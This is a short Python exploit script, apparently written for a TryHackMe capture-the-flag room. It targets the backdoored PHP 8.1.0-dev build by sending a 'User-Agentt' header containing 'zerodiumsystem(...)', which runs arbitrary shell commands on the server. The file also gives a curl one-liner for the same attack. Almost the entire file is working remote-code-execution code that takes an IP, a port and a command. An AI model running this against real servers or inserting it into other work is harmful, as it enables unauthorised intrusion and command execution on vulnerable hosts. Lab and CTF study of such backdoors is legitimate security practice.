'''
    The Webserver returns "X-Powered-By: PHP/8.1.0-dev" in it's response headers,
    which is a version of php that includes a backdoor.
    
    https://www.exploit-db.com/exploits/49933

    Written for the TryHackMe Room: Agent-T (https://tryhackme.com/room/agentt)
'''

# curl -A 'Mozilla/5.0' -H 'User-Agentt: zerodiumsystem("id");'  http://10.10.201.200

import requests
import sys


def exploit(ip, port, cmd):
    url = "http://" + ip + ":" + port
    headers = {
        "User-Agent": "Firefox",
        "User-Agentt": "zerodiumsystem(\"" + cmd + "\");",
    }

    response = requests.get(url, headers=headers)
    
    # Removes HTML that got appended on the command's return string.
    index = response.text.find("<!DOCTYPE html>")

    if index > -1:
        return response.text[:index]
    else:
        return response.text


def main():
    ip = ""
    port = ""
    cmd = "id"

    if len(sys.argv) > 2:
        ip = sys.argv[1]
        port = sys.argv[2]

        if len(sys.argv) > 3:
            cmd = sys.argv[3]
    else:
        print("Usage: python3 php810dev_exploit.py [IP] [PORT] [Optional:CMD]")
        print("Example: python3 php810.dev_exploit.py 10.10.201.200 80 'ls -ahl'")
        return    

    print( exploit(ip, port, cmd) )
    


if __name__ == '__main__':
    main()